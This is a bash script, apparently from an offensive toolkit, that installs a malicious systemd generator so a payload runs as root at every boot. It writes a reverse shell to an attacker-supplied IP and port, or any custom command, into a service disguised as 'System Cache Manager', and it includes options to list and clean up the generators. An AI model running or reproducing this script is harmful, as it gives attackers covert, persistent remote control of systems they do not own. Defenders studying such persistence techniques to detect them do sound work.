#!/bin/bash
#
# Systemd Generator Persistence (T1543.002)
# Abuse systemd generators to execute payloads BEFORE any service at boot
# Source: pberba.github.io, PANIX
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_generator"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║       Systemd Generator Persistence (T1543.002)       ║"
echo "  ║   Runs payload BEFORE any service at boot via         ║"
echo "  ║   systemd generator → creates .service on the fly     ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Install malicious generator (reverse shell on boot)"
echo -e "  ${CYAN}[2]${NC} Install generator with custom command"
echo -e "  ${CYAN}[3]${NC} List installed generators"
echo -e "  ${CYAN}[4]${NC} Cleanup"
echo ""
read -p "Choice [1-4]: " OPT

GEN_DIRS=("/etc/systemd/system-generators" "/usr/local/lib/systemd/system-generators" "/lib/systemd/system-generators")

pick_gen_dir() {
    echo -e "${YELLOW}[?] Generator directory:${NC}"
    for i in "${!GEN_DIRS[@]}"; do
        echo -e "  [$(( i + 1 ))] ${GEN_DIRS[$i]}"
    done
    read -p "Choice [1]: " GIDX
    GIDX="${GIDX:-1}"
    GEN_DIR="${GEN_DIRS[$(( GIDX - 1 ))]}"
    mkdir -p "$GEN_DIR" 2>/dev/null
}

install_generator() {
    local PAYLOAD="$1"
    local GEN_NAME="${2:-d3m0n-persist}"
    local SVC_NAME="${GEN_NAME}.service"

    pick_gen_dir

    local GEN_PATH="${GEN_DIR}/${GEN_NAME}"

    cat > "$GEN_PATH" << GENEOF
#!/bin/bash
# ${MARKER}
# Systemd generator — creates a service unit at boot

NORMAL_DIR="\$1"
EARLY_DIR="\$2"
LATE_DIR="\$3"

mkdir -p "\${NORMAL_DIR}"

cat > "\${NORMAL_DIR}/${SVC_NAME}" << SVCEOF
[Unit]
Description=System Cache Manager
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c '${PAYLOAD}'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SVCEOF

mkdir -p "\${NORMAL_DIR}/multi-user.target.wants"
ln -sf "\${NORMAL_DIR}/${SVC_NAME}" "\${NORMAL_DIR}/multi-user.target.wants/${SVC_NAME}" 2>/dev/null
GENEOF

    chmod 755 "$GEN_PATH"

    echo -e "${GREEN}[+] Generator installed: ${GEN_PATH}${NC}"
    echo -e "${GREEN}[+] Will create: ${SVC_NAME} at boot${NC}"
    echo -e "${YELLOW}[*] Test: systemctl daemon-reload && systemctl start ${SVC_NAME}${NC}"
}

case "$OPT" in
    1)
        read -p "Attacker IP: " LHOST
        read -p "Attacker Port: " LPORT
        PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'"
        read -p "Generator name [d3m0n-persist]: " GNAME
        GNAME="${GNAME:-d3m0n-persist}"
        install_generator "$PAYLOAD" "$GNAME"
        ;;
    2)
        read -p "Command to execute at boot: " PAYLOAD
        read -p "Generator name [d3m0n-persist]: " GNAME
        GNAME="${GNAME:-d3m0n-persist}"
        install_generator "$PAYLOAD" "$GNAME"
        ;;
    3)
        echo -e "${YELLOW}[*] Scanning generator directories...${NC}"
        for dir in "${GEN_DIRS[@]}"; do
            if [[ -d "$dir" ]]; then
                found=$(find "$dir" -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null)
                if [[ -n "$found" ]]; then
                    echo -e "${GREEN}  Found in $dir:${NC}"
                    echo "$found" | while read -r f; do echo "    $f"; done
                fi
            fi
        done
        ;;
    4)
        echo -e "${YELLOW}[*] Removing D3m0n generators...${NC}"
        for dir in "${GEN_DIRS[@]}"; do
            find "$dir" -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | while read -r f; do
                echo -e "  Removing: $f"
                rm -f "$f"
            done
        done
        systemctl daemon-reload 2>/dev/null
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
